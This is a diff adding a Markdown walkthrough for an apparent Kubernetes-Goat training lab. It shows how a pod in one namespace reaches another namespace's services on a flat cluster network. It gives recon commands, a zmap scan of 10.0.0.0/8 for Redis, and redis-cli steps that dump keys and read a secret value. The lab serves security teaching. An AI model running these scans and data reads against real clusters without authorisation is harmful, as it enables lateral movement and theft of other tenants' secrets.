@@ -1,0 +1,52 @@
+# Kubernetes Namespaces bypass
+
+## Scenario Information
+
+By default Kubernetes uses flat networking schema, which means any pod/service with in the cluster can talk to other. The namespaces with in the cluster doesn't have any network security restrictions by default. Anyone in the any namespace can talk to other namespace. We heard that Kubernetes-Goat loves cache. Let's see if we gain access to other namespaces
+
+* To get started with the scenario, let's run our awesome `hacker-container` in default namespace
+
+```bash
+kubectl run -it hacker-container --image=madhuakula/hacker-container -- sh
+```
+
+![Scenario 11 Welcome](images/sc-11-1.png)
+
+## Scenario Solution
+
+* Get the cluster IP range information
+
+```bash
+ip route
+ifconfig
+printenv
+```
+
+![Scenario 11 recon](images/sc-11-2.png)
+
+* Based on the analysis/understanding about the system. We can run the internal scan for the entire cluster range using `zamp`
+
+```bash
+zmap -p 6379 10.0.0.0/8 -o results.csv
+```
+
+![Scenario 11 zmap](images/sc-11-3.png)
+![Scenario 11 output ips](images/sc-11-4.png)
+
+> There is also another way to access the services/pods in the Kubernetes. For example `servicename.namespace`
+
+* Let's access the `redis` using the `reds-cli` client
+
+```bash
+redis-cli -h 10.12.0.2
+KEYS * 
+GET SECRETSTUFF
+```
+
+![Scenario 11 redis access](images/sc-11-5.png)
+
+> There are many other services and resources exposed with in the cluster like ElasticSearch, Mongo, etc. So if your recon skill is good then you got gold mine here.
+
+## Miscellaneous
+
+TBD
